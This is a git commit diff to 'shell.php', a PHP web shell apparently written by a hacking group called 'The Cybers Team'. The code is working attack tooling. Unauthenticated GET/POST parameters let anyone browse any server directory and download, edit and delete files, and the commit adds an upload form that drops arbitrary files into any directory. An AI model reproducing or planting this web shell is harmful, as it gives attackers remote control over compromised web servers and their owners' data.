32f297819294c29033bcdd3bbc8843ca4e2dc087
The Cybers <thecybersteam@gmail.com>
2016-09-10 05:47:31 -0400

    beta 0.5

--- README.md
+++
@@ -1,2 +0,0 @@
-# Shell
-The Cybers Shell
--- shell.php
+++ shell.php
@@ -1,54 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>The Cybers Shell</title>
-	<small>Coded by: Offset</small>
+	<title>The Cybers Shell [beta 0.5]</title>
 
 	<style>
-		body{
+
+		tr{
+			background-color:red;
+		}
+		body, h1 a{
 			background-color:black;
-			color:white;
+			color:#05ff05;
+			text-decoration: none;
 		}
 		th,td{
-			background-color:#555;
+			background-color:#111;
 			text-align: left;
 			width:200px;
+		}
+		.upar{
+			background-color:#111;
+			width:305px;
+			padding:5px;
+			margin-top:10px;
+		}
+		a{
+			color:red;
 		}
 	</style>
 </head>
 <body>
-<h1>The Cybers Shell</h1>
+<small>[Beta 0.5] www.fb.com/TheCybersTeam</small>
+<h1><a href="shell.php" title='Home'>The Cybers Shell</a></h1>
 
 <?php
 /*
 	By: The Cybers Team
-	Versão: Beta 0.4
+	Versão: Beta 0.5
 	[ok] listar
-	[ok] visualizar
+	[no] visualizar
 	[ok] download
 	[ok] editar
 	[ok] deletar
+
 */
+	// Configuração ==================================================
+	if(!$diretorio = $_GET['ls']){
+		$diretorio = getcwd();
+	}
+
 	// Funções =======================================================
 
+	function anterior($dir){
+		$dir = explode("/",$dir);
+		unset($dir[count($dir)-1]);
+		if($dir[1] == ""){
+			$dir[0] = "/";
+		}
+		return implode("/",$dir);
+	}
 	function listar($dir){
+		$anterior = anterior($dir);
 		echo "
 			<table>
 				<tr>
-					<th>File</th>
-					<th>Size</th>
-					<th>View</th>
+					<th>Arquivo</th>
+					<th>Tamanho</th>
+					<th>Abrir</th>
 					<th>Download</th>
-					<th>Edit</th>
-					<th>Delete</th>
+					<th>Editar</th>
+					<th>Excluir</th>
 				</tr>
 		";
-		foreach(scandir($dir) as $file){
-			if($file != "." && $file !=".."){
+		foreach(scandir($dir) as $nome){
+			$file = "$dir/$nome";
+			if($nome ==".."){
 				echo "<tr>";
-				echo "<td>".$file."</td>";
+				echo "<td><a href=?ls=$anterior>..</a></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "</tr>";	
+			}
+			if(!is_file($file) and $nome != ".." and $nome != "."){
+				echo "<tr>";
+				echo "<td><a href=?ls=$file>$nome</a></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "<td></td>";
+				echo "</tr>";
+			}
+			if($nome != "." && $nome !=".." && is_file($file)){
+				echo "<tr>";	
+				echo "<td>".$nome."</td>";
 				echo "<td>".filesize($file)." bytes</td>";
-				echo "<td><a href='$file'>Visualizar</a></td>";
+				echo "<td><a href='#'>Visualizar</a></td>";
 				echo "<td><a href='?download=$file'>Download</a></td>";
 				echo "<td><a href='?editar=$file'>Editar</a></td>";
 				echo "<td><a href='?deletar=$file'>Deletar</a></td>";
@@ -91,6 +141,22 @@
 		unlink($arquivo);
 	}
 
+	function upar($diretorio){
+		echo "
+		<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
+			<input type='file' name='upload'/>
+			<input type='hidden' diretorio='$diretorio'/>
+			<input type='submit' value='Upar!'/>
+		</form>";
+
+	}
+
+	function upload($arquivo, $diretorio){
+		if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
+			echo "Upado com sucesso! :D";
+		}
+	}
+
 	// POST e GET ==================================================
 	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
 		salvar($salvar,$arquivo);
@@ -107,9 +173,13 @@
 		deletar($deletar);
 	}
 
+	if($upar = $_FILES['upload']){
+		upload($upar, $diretorio);
+	}
+
 	// Shell =======================================================
-	$diretorio = getcwd();
 	listar($diretorio);
+	upar($diretorio);
 
 
 	?>
